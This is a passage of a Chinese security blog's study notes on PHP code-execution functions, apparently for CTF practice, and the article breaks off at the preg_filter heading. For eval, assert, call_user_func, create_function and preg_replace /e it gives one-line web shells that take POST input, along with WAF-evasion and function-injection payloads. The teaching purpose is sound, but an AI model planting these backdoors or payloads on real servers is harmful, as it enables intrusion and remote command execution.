@@ -1,0 +1,661 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="baidu-site-verification" content="5ZQsOe30cm" />
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"southsea.st","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"disqusjs","storage":true,"lazyload":false,"nav":null,"activeClass":"disqusjs"},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="本周任务，学习木马的执行函数。 根据查找到的资料，执行函数分为两类，代码执行函数和命令执行函数。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web安全执行函数修炼计划">
+<meta property="og:url" content="https://southsea.st/Study-Execution-Function/index.html">
+<meta property="og:site_name" content="南溟NaN">
+<meta property="og:description" content="本周任务，学习木马的执行函数。 根据查找到的资料，执行函数分为两类，代码执行函数和命令执行函数。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2018-08-15T00:00:00.000Z">
+<meta property="article:modified_time" content="2025-01-24T03:34:53.073Z">
+<meta property="article:author" content="南溟NaN">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web安全修炼计划">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://southsea.st/Study-Execution-Function/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://southsea.st/Study-Execution-Function/","path":"Study-Execution-Function/","title":"Web安全执行函数修炼计划"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Web安全执行函数修炼计划 | 南溟NaN</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">南溟NaN</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">在这浩瀚星河的你是什么</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">24</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">5</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">68</span></a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">1.</span> <span class="nav-text">代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#eval"><span class="nav-number">1.1.</span> <span class="nav-text">eval</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#assert"><span class="nav-number">1.2.</span> <span class="nav-text">assert</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BE%E4%BE%8B"><span class="nav-number">1.2.1.</span> <span class="nav-text">举例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%93%E5%B1%95"><span class="nav-number">1.2.2.</span> <span class="nav-text">拓展</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#call_user_func"><span class="nav-number">1.3.</span> <span class="nav-text">call_user_func</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#call_user_func_array"><span class="nav-number">1.4.</span> <span class="nav-text">call_user_func_array</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#create_function"><span class="nav-number">1.5.</span> <span class="nav-text">create_function</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%93%E5%B1%95-1"><span class="nav-number">1.5.1.</span> <span class="nav-text">拓展</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#preg_replace"><span class="nav-number">1.6.</span> <span class="nav-text">preg_replace</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#preg_filter"><span class="nav-number">1.7.</span> <span class="nav-text">preg_filter</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#preg_replace_callback"><span class="nav-number">1.8.</span> <span class="nav-text">preg_replace_callback</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mb_ereg_replace"><span class="nav-number">1.9.</span> <span class="nav-text">mb_ereg_replace</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mb_ereg_replace_callback"><span class="nav-number">1.10.</span> <span class="nav-text">mb_ereg_replace_callback</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#callbackfilteriterator"><span class="nav-number">1.11.</span> <span class="nav-text">CallbackFilterIterator</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#filter_var"><span class="nav-number">1.12.</span> <span class="nav-text">filter_var</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#filter_var_array"><span class="nav-number">1.13.</span> <span class="nav-text">filter_var_array</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#array_map"><span class="nav-number">1.14.</span> <span class="nav-text">array_map</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#array_filter"><span class="nav-number">1.15.</span> <span class="nav-text">array_filter</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#array_walk"><span class="nav-number">1.16.</span> <span class="nav-text">array_walk</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#array_walk_recursive"><span class="nav-number">1.17.</span> <span class="nav-text">array_walk_recursive</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#array_reduce"><span class="nav-number">1.18.</span> <span class="nav-text">array_reduce</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#array_udiff"><span class="nav-number">1.19.</span> <span class="nav-text">array_udiff</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#register_shutdown_function"><span class="nav-number">1.20.</span> <span class="nav-text">register_shutdown_function</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#register_tick_function"><span class="nav-number">1.21.</span> <span class="nav-text">register_tick_function</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#usort"><span class="nav-number">1.22.</span> <span class="nav-text">usort</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#uasort"><span class="nav-number">1.23.</span> <span class="nav-text">uasort</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#uksort"><span class="nav-number">1.24.</span> <span class="nav-text">uksort</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A9%E5%B1%95"><span class="nav-number">1.24.1.</span> <span class="nav-text">扩展</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlitecreatefunction"><span class="nav-number">1.25.</span> <span class="nav-text">sqliteCreateFunction</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A9%E5%B1%95-1"><span class="nav-number">1.25.1.</span> <span class="nav-text">扩展</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#yaml_parse"><span class="nav-number">1.26.</span> <span class="nav-text">yaml_parse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#memcache"><span class="nav-number">1.27.</span> <span class="nav-text">Memcache</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">2.</span> <span class="nav-text">命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#system"><span class="nav-number">2.1.</span> <span class="nav-text">system</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exec"><span class="nav-number">2.2.</span> <span class="nav-text">exec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shell_exec"><span class="nav-number">2.3.</span> <span class="nav-text">shell_exec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#passthru"><span class="nav-number">2.4.</span> <span class="nav-text">passthru</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BC%95%E5%8F%B7"><span class="nav-number">2.5.</span> <span class="nav-text">反引号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ob_start"><span class="nav-number">2.6.</span> <span class="nav-text">ob_start</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#popen"><span class="nav-number">2.7.</span> <span class="nav-text">popen</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#proc_open"><span class="nav-number">2.8.</span> <span class="nav-text">proc_open</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pcntl_exec"><span class="nav-number">2.9.</span> <span class="nav-text">pcntl_exec</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">3.</span> <span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#codebreakingphplimit"><span class="nav-number">3.1.</span> <span class="nav-text">2018&#x2F;CodeBreaking&#x2F;phplimit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gxyctf%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="nav-number">3.2.</span> <span class="nav-text">2019&#x2F;GXYCTF&#x2F;禁止套娃</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABrce_no_para"><span class="nav-number">3.3.</span> <span class="nav-text">2022&#x2F;长安&quot;战疫&quot;&#x2F;RCE_No_Para</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%94%E7%BB%86ping"><span class="nav-number">3.4.</span> <span class="nav-text">2023&#x2F;仔细ping</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#refer"><span class="nav-number">4.</span> <span class="nav-text">Refer</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="南溟NaN"
+      src="https://avatars.githubusercontent.com/u/34373144?v=4">
+  <p class="site-author-name" itemprop="name">南溟NaN</p>
+  <div class="site-description" itemprop="description">在这浩瀚星河的你是什么</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">68</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/southseast" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;southseast" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:st.southsea@gmail.com" title="E-Mail → mailto:st.southsea@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://southsea.st/Study-Execution-Function/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/34373144?v=4">
+      <meta itemprop="name" content="南溟NaN">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="南溟NaN">
+      <meta itemprop="description" content="在这浩瀚星河的你是什么">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Web安全执行函数修炼计划 | 南溟NaN">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Web安全执行函数修炼计划
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2018-08-15 00:00:00" itemprop="dateCreated datePublished" datetime="2018-08-15T00:00:00+00:00">2018-08-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>本周任务，学习木马的执行函数。</p>
+<p>根据查找到的资料，执行函数分为两类，代码执行函数和命令执行函数。</p>
+<span id="more"></span>
+<p>短路与<strong>&amp;&amp;</strong>，前者为真，才执行后边；前边为假，都不执行。</p>
+<p>逻辑与<strong>&amp;</strong>，无论前边真假，都执行。</p>
+<p>短路或<strong>||</strong>，前者为真，后者不执行；前者为假，后者执行。</p>
+<p>逻辑或<strong>|</strong>，无论前边真假，都执行。</p>
+<h1 id="代码执行">代码执行</h1>
+<h2 id="eval">eval</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="keyword">string</span> <span class="variable">$code</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>
+<p>该函数是将传入的字符串当做<strong>PHP</strong>代码执行，必须以分号结尾，不支持动态调用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="string">&quot;echo &#x27;1&#x27;;&quot;</span>);</span><br><span class="line"><span class="comment"># south</span></span><br></pre></td></tr></table></figure>
+<p>以上是正常使用，下面是作为一句话木马的使用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br><span class="line"><span class="comment"># /?south=system(ls);</span></span><br></pre></td></tr></table></figure>
+<h2 id="assert">assert</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="keyword">mixed</span> <span class="variable">$assertion</span>, <span class="keyword">string</span> <span class="variable">$description</span> = ?): <span class="keyword">bool</span>    <span class="comment"># PHP5</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="keyword">mixed</span> <span class="variable">$assertion</span>, <span class="built_in">Throwable</span> <span class="variable">$exception</span> = ?): <span class="keyword">bool</span>   <span class="comment"># PHP7</span></span><br></pre></td></tr></table></figure>
+<p>第一个参数是将传入的字符串当做<strong>PHP</strong>代码执行，是用来判断表达式是否成立的，不需分号结尾，第二个参数可选，作为失败判断的回调信息打印。</p>
+<p><strong>assert_option()</strong>可以用来对<strong>assert()</strong>进行一些约束和控制。</p>
+<blockquote>
+<p><strong>PHP&gt;=5.4.8</strong>时支持<strong>assert</strong>二参数调用，<strong>PHP7</strong>默认不执行代码。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ASSERT_ACTIVE=1 // Assert函数的开关。</span><br><span class="line">ASSERT_WARNING =1 // 当表达式为false时，是否要输出警告性的错误提示。</span><br><span class="line">ASSERT_BAIL= 0 // 是否要中止运行。</span><br><span class="line">ASSERT_QUIET_EVAL= 0 // 在执行表达式时是否关闭错误提示。</span><br><span class="line">ASSERT_CALLBACK= (NULL) // 是否启动回调函数 user function to call on failed assertions</span><br></pre></td></tr></table></figure>
+<h3 id="举例">举例</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">assert</span>(<span class="string">&#x27;1==1&#x27;</span>);</span><br><span class="line"><span class="comment"># bool(true)</span></span><br></pre></td></tr></table></figure>
+<p>以上是正常使用，下面是作为一句话木马的使用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=system(ls);	</span></span><br></pre></td></tr></table></figure>
+<h3 id="拓展">拓展</h3>
+<p>在<strong>PHP7.1</strong>以下，<strong>assert()</strong>函数可以被动态调用，是大多数过狗一句话的原理。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$_POST</span>[<span class="string">&#x27;south&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;sea&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=assert&amp;sea=system(ls);</span></span><br></pre></td></tr></table></figure>
+<h2 id="call_user_func">call_user_func</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> ...<span class="variable">$args</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>
+<p>第一个参数是回调函数的函数名，后面皆是回调函数的参数。</p>
+<p><strong>is_callable()</strong>函数可以检测是否为回调函数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;assert&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=system(ls)</span></span><br></pre></td></tr></table></figure>
+<h2 id="call_user_func_array">call_user_func_array</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">array</span> <span class="variable">$args</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>
+<p>同上，不过第二个参数传入的是数组。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$command</span>[<span class="number">0</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;south&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&quot;assert&quot;</span>, <span class="variable">$command</span>);</span><br><span class="line"><span class="comment"># south=system(ls)</span></span><br></pre></td></tr></table></figure>
+<h2 id="create_function">create_function</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="keyword">string</span> <span class="variable">$args</span>, <span class="keyword">string</span> <span class="variable">$code</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
+<p>创建一个匿名函数，第一个参数是匿名函数传入的参数名，第二个参数是匿名函数的代码。</p>
+<blockquote>
+<p>易被查杀，<strong>PHP7</strong>不可用</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$sea</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$command&#x27;</span>, <span class="string">&#x27;eval($command);&#x27;</span>);</span><br><span class="line">    <span class="variable">$sea</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=system(ls)</span></span><br></pre></td></tr></table></figure>
+<h3 id="拓展-1">拓展</h3>
+<p>题目如下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$south</span> = <span class="string">&#x27;echo s&#x27;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;south&#x27;</span>] . <span class="string">&#x27;;&#x27;</span>;</span><br><span class="line"><span class="variable">$sea</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$south</span>);</span><br><span class="line"><span class="comment"># south=;&#125;phpinfo();/*</span></span><br></pre></td></tr></table></figure>
+<p>正常情况下创建的函数如下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sea</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;s&#x27;</span> . <span class="variable">$command</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>构造恶意代码提前闭合函数，构造好的函数如下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sea</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;s&#x27;</span>;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">/*</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>因此得以执行。</p>
+<h2 id="preg_replace">preg_replace</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$pattern</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$replacement</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$subject</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span>,</span><br><span class="line">    <span class="keyword">int</span> &amp;<span class="variable">$count</span> = <span class="literal">null</span></span><br><span class="line">): <span class="keyword">string</span>|<span class="keyword">array</span>|<span class="literal">null</span></span><br></pre></td></tr></table></figure>
+<p>该函数为在<strong>$subject</strong>参数中匹配<strong>$pattern</strong>参数替换为<strong>$replacement</strong>，而其<strong>$pattern</strong>参数存在的<strong>/e</strong>修饰符会使得<strong>$replacement</strong>参数被当做<strong>PHP</strong>代码解析。</p>
+<blockquote>
+<p>在<strong>PHP7</strong>中被修正。</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/sea/e&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;south&#x27;</span>], <span class="string">&quot;sea&quot;</span>);</span><br><span class="line"><span class="comment"># south=system(ls)</span></span><br></pre></td></tr></table></figure>
+<h2 id="preg_filter">preg_filter</h2>
